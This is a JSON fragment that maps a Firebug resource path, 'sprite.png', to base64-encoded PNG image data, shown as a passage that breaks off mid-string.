{"/system/app/FireBug/res/sprite.png": "iVBORw0KGgoAAAANSUhEUgAAAEAAAACbCAYAAADSkJ0yAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9kGBQYpItTQQGgAACAASURBVHgBAH9/gIABrKiZ/wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAH/////AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABO/v7wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEBQYJAAAAAAAAAQAAAAAAAAD/AAAAAAAAAAEAAAAAAAAA/wAAAAAAAAABAAAAAAAAAP8AAAAAAAAAAQAAAAAAAAD/AAAAAAAAAAEAAAAAAAAA/wAAAAAAAAABAAAAAAAAAP8AAAAAAAAAAQAAAAAAAAD/AAAAAAAAAAEAAAAAAAAA/wAAAAAAAAABAAAAAAAAAP8AAAAAAAAAAQAAAAAAAAD/AAAAAAAAAAEAAAAAAAAA/wAAAAAAAAABAAAAAAAAAP8AAAAAAAAAAQAAAAAAAAD/AAAAAAAAAAEAAAAAAAAA/wAAAAAAAAABAAAAAAAAAP8AAAAAAAAAAQAAAAAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAB/wAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAEAAAAAAP//AAAAAAAAAQEAAAAAAAD//wAAAAAAAAEBAAAAAAAA//8AAAAAAAABAQAAAAAAAP//AAAAAAAAAQEAAAAAAAD//wAAAAAAAAEBAAAAAAAA//8AAAAAAAABAQAAAAAAAP//AAAAAAAAAQEAAAAAAAD//wAAAAAAAAEBAAAAAAAA//8AAAAAAAABAQAAAAAAAP//AAAAAAAAAQEAAAAAAAD//wAAAAAAAAEBAAAAAAAA//8AAAAAAAABAQAAAAAAAP//AAAAAAAAAQEAAAAAAAD//wAAAAAAAAEBAAAAAAAA//8AAAAAAAABAQAAAAAAAP//AAAAAAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAT///sAAAAAAAAAAAAAAAAA//8AAAAAAAAAAAAAAAAAAP//AAAAAAAAAAAAAAAAAAD//wAAAAAAAAAAAAAAAAAA//8AAAAAAAAAAAAAAAAAAP//AAAAAAAAAAAAAAAAAAD//wAAAAAAAAAAAAAAAAAA//8AAAAAAAAAAAAAAAAAAP//AAAAAAAAAAAAAAAAAAD//wAAAAAAAAAAAAAAAAAA//8AAAAAAAAAAAAAAAAAAP//AAAAAAAAAAAAAAAAAAD//wAAAAAAAAAAAAAAAAAA//8AAAAAAAAAAAAAAAAAAP//AAAAAAAAAAAAAAAAAAD//wAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAE////AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAD//QAAAAAAAP8BAAAAAAAAAf8AAAAAAAD/AQAAAAAAAAH/AAAAAAAA/wEAAAAAAAAB/wAAAAAAAP8BAAAAAAAAAf8AAAAAAAD/AQAAAAAAAAH/AAAAAAAA/wEAAAAAAAAB/wAAAAAAAP8BAAAAAAAAAf8AAAAAAAD/AQAAAAAAAAH/AAAAAAAA/wEAAAAAAAAB/wAAAAAAAP8BAAAAAAAAAf8AAAAAAAD/AQAAAAAAAAH/AAAAAAAA/wEAAAAAAAAB/wAAAAAAAP8BAAAAAAAAAf8AAAAAAAD/AQAAAAAAAAH/AAAAAAAA/wEAAAAAAAAB/wAAAAAAAP8BAAAAAAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAT+/v4AAAAAAAAAAAAAAAAAAP8AAAAAAAAAAAAAAAAAAAD/AAAAAAAAAAAAAAAAAAAA/wAAAAAAAAAAAAAAAAAAAP8AAAAAAAAAAAAAAAAAAAD/AAAAAAAAAAAAAAAAAAAA/wAAAAAAAAAAAAAAAAAAAP8AAAAAAAAAAAAAAAAAAAD/AAAAAAAAAAAAAAAAAAAA/wAAAAAAAAAAAAAAAAAAAP8AAAAAAAAAAAAAAAAAAAD/AAAAAAAAAAAAAAAAAAAA/wAAAAAAAAAAAAAAAAAAAP8AAAAAAAAAAAAAAAAAAAD/AAAAAAAAAAAAAAAAAAAA/wAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQA//0AAAAAAAD/AAAAAAAAAAEAAAAAAAAA/wAAAAAAAAABAAAAAAAAAP8AAAAAAAAAAQAAAAAAAAD/AAAAAAAAAAEAAAAAAAAA/wAAAAAAAAABAAAAAAAAAP8AAAAAAAAAAQAAAAAAAAD/AAAAAAAAAAEAAAAAAAAA/wAAAAAAAAABAAAAAAAAAP8AAAAAAAAAAQAAAAAAAAD/AAAAAAAAAAEAAAAAAAAA/wAAAAAAAAABAAAAAAAAAP8AAAAAAAAAAQAAAAAAAAD/AAAAAAAAAAEAAAAAAAAA/wAAAAAAAAABAAAAAAAAAP8AAAAAAAAAAQAAAAAAAAD/AAAAAAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAE/v78AAAAAAAAAAAAAAAAAAD/AAAAAAAAAAAAAAAAAAAA/wAAAAAAAAAAAAAAAAAAAP8AAAAAAAAAAAAAAAAAAAD/AAAAAAAAAAAAAAAAAAAA/wAAAAAAAAAAAAAAAAAAAP8AAAAAAAAAAAAAAAAAAAD/AAAAAAAAAAAAAAAAAAAA/wAAAAAAAAAAAAAAAAAAAP8AAAAAAAAAAAAAAAAAAAD/AAAAAAAAAAAAAAAAAAAA/wAAAAAAAAAAAAAAAAAAAP8AAAAAAAAAAAAAAAAAAAD/AAAAAAAAAAAAAAAAAAAA/wAAAAAAAAAAAAAAAAAAAP8AAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABP/+/gAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAE/f36AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAT39/MAAAAAAAAAAQAAAAAAAAD/AAAAAAAAAAEAAAAAAAAA/wAAAAAAAAABAAAAAAAAAP8AAAAAAAAAAQAAAAAAAAD/AAAAAAAAAAEAAAAAAAAA/wAAAAAAAAABAAAAAAAAAP8AAAAAAAAAAQAAAAAAAAD/AAAAAAAAAAEAAAAAAAAA/wAAAAAAAAABAAAAAAAAAP8AAAAAAAAAAQAAAAAAAAD/AAAAAAAAAAEAAAAAAAAA/wAAAAAAAAABAAAAAAAAAP8AAAAAAAAAAQAAAAAAAAD/AAAAAAAAAAEAAAAAAAAA/wAAAAAAAAABAAAAAAAAAP8AAAAAAAAAAQAAAAAABO3r6wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAE7O30AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQhIRkAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABP38/QAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQBAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAiKZySwAAIABJREFUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQBAQEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAABAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAQEBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQBAQEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAgEBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQCAgIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAEBAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAQEBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQCAgIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA